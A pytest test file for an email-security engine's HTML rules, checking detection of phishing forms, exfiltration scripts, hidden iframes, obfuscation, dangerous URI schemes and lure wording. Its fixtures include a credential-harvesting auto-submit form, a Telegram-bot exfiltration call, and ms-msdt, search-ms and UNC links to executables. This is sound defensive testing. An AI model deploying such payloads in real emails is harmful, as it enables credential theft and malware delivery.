"""HTML surface rules of the email engine: forms, exfiltration, frames, scripts,
entity obfuscation, dangerous URI schemes, and the link / wording facts."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from docutracex import mailengine
from docutracex.parsers.mail_rules import analyze_html

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
ms = pytest.importorskip("make_samples")


def _rules(html: str) -> set[str]:
    return {f["rule"] for f in analyze_html(html)}


def test_payment_form_mailto_auto_submit_and_exfil():
    html = ('<form id="f" action="mailto:x@buzon-aviso.example"><input type="password" name="p">'
            '<input name="cardnumber"><input name="cvv"></form>'
            "<script>fetch('https://api.telegram.org/bot0:inert/sendMessage');document.getElementById('f').submit()</script>")
    r = _rules(html)
    assert {"html_payment_form", "html_form_mailto", "html_auto_submit", "html_exfil_script",
            "html_credential_form"} <= r


def test_script_posting_a_password_form_is_exfiltration_without_a_known_channel():
    r = _rules('<input type="password" id="p"><script>var x=new XMLHttpRequest();x.open("POST","/c")</script>')
    assert "html_exfil_script" in r
    # a fetch with no password field and no chat-bot channel is not
    assert "html_exfil_script" not in _rules("<script>fetch('/api/news')</script>")


def test_frames_redirects_obfuscation_and_injection():
    html = ('<iframe src="https://t.example/x" width="0" height="0"></iframe>'
            "<script>eval(atob('YQ=='));var s=document.createElement('script');top.location='https://x.example'</script>")
    r = _rules(html)
    assert {"html_hidden_iframe", "html_js_redirect", "html_script_obfuscated", "html_dynamic_script"} <= r
    assert "html_remote_iframe" in _rules('<iframe src="https://maps.example/embed"></iframe>')
    # one decoding call alone is not obfuscation; a comparison is not a redirect
    assert not {"html_script_obfuscated", "html_js_redirect"} & _rules("<script>if(location == x){atob('YQ==')}</script>")


def test_entity_obfuscation_and_dangerous_schemes():
    ent = "".join(f"&#x{ord(c):x};" for c in "https://x.example/a")
    assert "html_entity_obfuscation" in _rules(f'<a href="{ent}">a</a>')
    for href in ("search-ms:query=x&crumb=location:\\\\198.51.100.61\\s", "ms-msdt:/id PCWDiagnostic",
                 "ms-appinstaller:?source=https://x.example/a.appx", "ms-word:ofe|u|https://x.example/a.docx",
                 "file://198.51.100.61/share/a.lnk", "\\\\198.51.100.61\\share\\a.exe"):
        assert "html_dangerous_uri" in _rules(f'<a href="{href}">x</a>'), href
    assert "html_dangerous_uri" not in _rules('<a href="https://x.example/search-ms">x</a>')


def test_offscreen_and_invisible_text_count_as_hidden():
    html = ('<div style="position:absolute;left:-9999px">a</div><span style="text-indent:-5000px">b</span>'
            '<p style="opacity:0;">c</p>')
    assert "hidden_text" in _rules(html)


def test_link_facts_shortener_deep_subdomain_ftp():
    assert mailengine.shortener("bit.ly") and mailengine.shortener("www.tinyurl.com")
    assert not mailengine.shortener("bitly.example")
    p = mailengine._phish_url_patterns(
        ["https://login.microsoftonline.com.secure-check.buzon-aviso.example/x", "https://a.b.c.d.buzon-aviso.example/",
         "https://www.news.example.com/a"], [], "remitente.example")
    assert len(p["deep_subdomain"]) == 2


def test_surface_sample_end_to_end_facts(tmp_path):
    from docutracex.parsers import mail
    p = tmp_path / "s.eml"
    p.write_bytes(ms.html_surface_eml())
    email = mail.analyze(p, ".eml", tmp_path / "extracted")
    f = mailengine.facts(email, {})
    assert f["links"]["shortener"] == ["is.gd"]
    assert f["links"]["deep_subdomain"] and f["links"]["ftp"]
    rules = {m["id"] for m in mailengine.run(f, "email", {"findings": [], "case_findings": []})}
    assert {"link_shortener", "link_deep_subdomain", "link_ftp", "refund_lure", "phishing_wording_stack"} <= rules


def test_wording_lexicons_compile_and_match():
    lex = mailengine.rules()["lexicons"]
    import re
    assert re.search(lex["refund"], "tiene un reembolso pendiente", re.I)
    assert re.search(lex["cta"], "Haga clic aquí", re.I)
    assert re.search(lex["security_alert"], "Security alert: unauthorized login", re.I)
